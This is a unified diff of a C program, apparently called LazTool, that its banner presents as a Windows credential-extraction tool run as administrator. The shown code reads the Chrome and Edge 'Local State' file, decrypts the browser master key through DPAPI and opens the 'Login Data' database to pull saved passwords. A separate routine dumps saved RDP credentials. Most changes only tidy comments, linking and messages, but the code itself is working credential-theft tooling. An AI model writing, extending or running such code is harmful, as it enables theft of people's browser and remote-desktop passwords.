@@ -1,9 +1,10 @@
-// file: laztool_advanced.c
-// 编译: x64 Native Tools Command Prompt -> cl /O2 /MT /Fe:LazTool.exe laztool_advanced.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib
-// 运行: 必须以管理员身份运行
+// laztool_final.c
+// 编译命令 (x64 Native Tools Command Prompt):
+// cl /O2 /MT /Fe:LazTool.exe laztool_final.c sqlite3.c /link wlanapi.lib dbghelp.lib credui.lib crypt32.lib bcrypt.lib shell32.lib
 
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
+#include <shlobj.h>      // 解决 CSIDL_LOCAL_APPDATA
 #include <wlanapi.h>
 #include <tlhelp32.h>
 #include <dbghelp.h>
@@ -20,6 +21,7 @@
 #pragma comment(lib, "shlwapi.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "shell32.lib")   // 确保 SHGetFolderPathW 链接
 
 #ifndef WLAN_PROFILE_GET_PLAINTEXT
 #define WLAN_PROFILE_GET_PLAINTEXT 0x00000002
@@ -83,7 +85,7 @@ DWORD GetProcessPid(const wchar_t* procName) {
     return pid;
 }
 
-// --------------------- 模块：Chromium 密码解密 --------------------
+// --------------------- Chromium 密码解密 --------------------
 BYTE* DecryptDPAPIBlob(BYTE* pEncryptedData, DWORD dwDataSize, DWORD* pdwOutSize) {
     DATA_BLOB DataIn, DataOut;
     DataIn.pbData = pEncryptedData;
@@ -125,10 +127,9 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
     wcscpy_s(localStatePath, MAX_PATH, userDataPath);
     wcscat_s(localStatePath, MAX_PATH, L"\\Local State");
 
-    // 1. 读取 Local State 文件
     HANDLE hFile = CreateFileW(localStatePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[!] %S not found or inaccessible.\n", browserName);
+        printf("[!] %S user data not found at %S\n", browserName, userDataPath);
         return;
     }
     DWORD fileSize = GetFileSize(hFile, NULL);
@@ -138,7 +139,6 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
     jsonData[fileSize] = '\0';
     CloseHandle(hFile);
 
-    // 2. 解析 JSON 获取 encrypted_key
     char* keyTag = strstr(jsonData, "\"encrypted_key\":\"");
     if (!keyTag) { free(jsonData); return; }
     keyTag += 18;
@@ -146,23 +146,19 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
     if (!keyEnd) { free(jsonData); return; }
     *keyEnd = '\0';
 
-    // 3. Base64 解码
     DWORD base64Len = 0;
     CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, NULL, &base64Len, NULL, NULL);
     BYTE* base64Decoded = (BYTE*)malloc(base64Len);
     CryptStringToBinaryA(keyTag, 0, CRYPT_STRING_BASE64, base64Decoded, &base64Len, NULL, NULL);
 
-    // 4. 去除 "DPAPI" 前缀 (5字节)
     BYTE* encryptedKey = base64Decoded + 5;
     DWORD encryptedKeyLen = base64Len - 5;
 
-    // 5. DPAPI 解密主密钥
     DWORD masterKeyLen = 0;
     BYTE* masterKey = DecryptDPAPIBlob(encryptedKey, encryptedKeyLen, &masterKeyLen);
     free(base64Decoded);
     if (!masterKey) { free(jsonData); return; }
 
-    // 6. 读取 Login Data 数据库
     wchar_t loginDataPath[MAX_PATH];
     wcscpy_s(loginDataPath, MAX_PATH, userDataPath);
     wcscat_s(loginDataPath, MAX_PATH, L"\\Default\\Login Data");
@@ -202,7 +198,7 @@ void ExtractChromePasswords(const wchar_t* userDataPath, const wchar_t* browserN
     free(jsonData);
 }
 
-// --------------------- 模块：RDP 保存密码 --------------------
+// --------------------- RDP 保存密码 --------------------
 void DumpRDPCredentials() {
     printf("\n[+] ===== RDP Saved Credentials =====\n");
     PCREDENTIALW* pCreds = NULL;
@@ -241,11 +237,11 @@ void DumpRDPCredentials() {
     }
 }
 
-// --------------------- 主函数：构造用户目录并调用 --------------------
+// --------------------- 主函数 --------------------
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     printf("=========================================================\n");
-    printf("     Windows 凭据提取工具 v5.0 (管理员运行)             \n");
+    printf("     Windows 凭据提取工具 v6.0 (管理员运行)             \n");
     printf("=========================================================\n");
     if (!IsElevated()) {
         printf("\n[-] Please run as Administrator.\n");
@@ -253,7 +249,7 @@ int main() {
         return 1;
     }
 
-    // 获取当前用户的 AppData Local 路径
+    // 获取当前用户的 Local AppData 路径
     wchar_t appDataLocal[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appDataLocal))) {
         wchar_t chromePath[MAX_PATH];
@@ -266,11 +262,12 @@ int main() {
         wcscat_s(edgePath, MAX_PATH, L"\\Microsoft\\Edge\\User Data");
         ExtractChromePasswords(edgePath, L"Edge");
     } else {
-        printf("[-] Failed to get AppData path.\n");
+        printf("[-] Failed to get Local AppData path.\n");
     }
 
     DumpRDPCredentials();
 
-    printf("\n[*] Execution completed.\n");
+    printf("\n[*] Execution completed. Press Enter to exit.\n");
+    getchar();
     return 0;
 }
